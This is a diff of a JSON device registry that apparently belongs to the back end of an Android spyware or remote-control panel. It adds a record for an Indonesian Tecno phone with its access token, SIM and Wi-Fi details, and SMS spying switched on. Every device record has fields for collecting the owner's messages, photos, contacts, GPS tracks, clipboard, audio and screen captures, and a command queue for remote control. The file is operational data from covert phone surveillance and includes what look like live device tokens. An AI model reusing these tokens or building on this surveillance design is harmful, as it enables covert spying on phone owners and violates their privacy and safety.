@@ -4,7 +4,7 @@
     "deviceName": "HP-ABLO-F55F",
     "ownerUsername": "Zarr",
     "token": "7055f57f74cb7eef5034e3301d747b14",
-    "lastSeen": 1777715489597,
+    "lastSeen": 1777715492594,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T05:33:28.300Z",
@@ -1958,5 +1958,37 @@
       ],
       "receivedAt": 1777714270781
     }
+  },
+  {
+    "deviceId": "aimlock_9dfcc2e8",
+    "deviceName": "TECNO MOBILE LIMITED TECNO LE7",
+    "ownerUsername": "Zal7Sex",
+    "token": "9824ee799ce0d1244bf5dd090d3dc148",
+    "lastSeen": 1777715493160,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-05-02T09:51:33.160Z",
+    "deviceInfo": {
+      "model": "TECNO MOBILE LIMITED TECNO LE7",
+      "androidVersion": "Android 11",
+      "battery": 22,
+      "network": "WiFi: Zal7Sex 5G",
+      "sim1": "Indosat Ooredoo",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
